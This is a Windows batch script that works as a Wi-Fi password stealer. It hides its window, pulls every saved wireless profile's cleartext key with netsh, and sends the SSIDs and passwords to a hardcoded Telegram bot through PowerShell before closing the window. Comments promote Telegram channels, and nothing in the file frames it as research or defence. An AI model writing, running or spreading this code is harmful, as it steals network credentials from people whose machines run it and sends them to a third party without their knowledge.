@echo off
setlocal enabledelayedexpansion

set "botToken=7605005911:AAFGRr4k25QbRLOlxcT-6lb3riLB5iWlCjI"
set "chatID=5709299213"

:: https://t.me/rmsup
:SendTelegramMessage
set "message=%~1"
set "message=!message:"=\"!"
set "message=!message:'=''!"
powershell -command "$url = 'https://api.telegram.org/bot%botToken%/sendMessage'; $parameters = @{ chat_id = '%chatID%'; text = '%message%' }; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body ($parameters | ConvertTo-Json) | Out-Null"
goto :EOF

:: API imports equivalent
:: This part is not directly translatable to CMD, but we'll handle the window operations differently

:: https://t.me/secbaz
:: Minimize window (simulated)
powershell -command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class CustomWin32 { [DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport(\"user32.dll\")] public static extern IntPtr GetForegroundWindow(); }'; $HWND = [CustomWin32]::GetForegroundWindow(); [CustomWin32]::ShowWindow($HWND, 6)"

:: Get WiFi profiles
set "profilesFound=0"
for /f "tokens=2 delims=:" %%a in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
    set "profile=%%a"
    set "profile=!profile:~1!"
    set /a profilesFound+=1
    
    for /f "delims=" %%b in ('netsh wlan show profile name^="!profile!" key^=clear') do (
        set "line=%%b"
        if "!line:Profile=!" neq "!line!" (
            for /f "tokens=2 delims=:" %%c in ("!line!") do set "profileName=%%c"
            set "profileName=!profileName:~1!"
        )
        if "!line:SSID name=!" neq "!line!" (
            for /f "tokens=2 delims=:" %%c in ("!line!") do set "ssid=%%c"
            set "ssid=!ssid:~1!"
        )
        if "!line:Authentication=!" neq "!line!" (
            for /f "tokens=2 delims=:" %%c in ("!line!") do set "authentication=%%c"
            set "authentication=!authentication:~1!"
        )
        if "!line:Key Content=!" neq "!line!" (
            for /f "tokens=2 delims=:" %%c in ("!line!") do set "keyContent=%%c"
            set "keyContent=!keyContent:~1!"
        )
    )
    
    set "message=Profile Name: !profileName!"
    set "message=!message!&echo.SSID: !ssid!"
    set "message=!message!&echo.Authentication: !authentication!"
    set "message=!message!&echo.Key Content: !keyContent!"
    
    call :SendTelegramMessage "!message!"
    set "profileName="
    set "ssid="
    set "authentication="
    set "keyContent="
)

if %profilesFound% equ 0 (
    call :SendTelegramMessage "No Wi-Fi profiles found on this system."
)

:: Close window (simulated)
powershell -command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class CustomWin32 { [DllImport(\"user32.dll\")] public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam); [DllImport(\"user32.dll\")] public static extern IntPtr GetForegroundWindow(); }'; $HWND = [CustomWin32]::GetForegroundWindow(); $WM_CLOSE = 0x0010; [CustomWin32]::PostMessage($HWND, $WM_CLOSE, 0, 0)"

:: https://t.me/rmsup https://t.me/secbaz
endlocal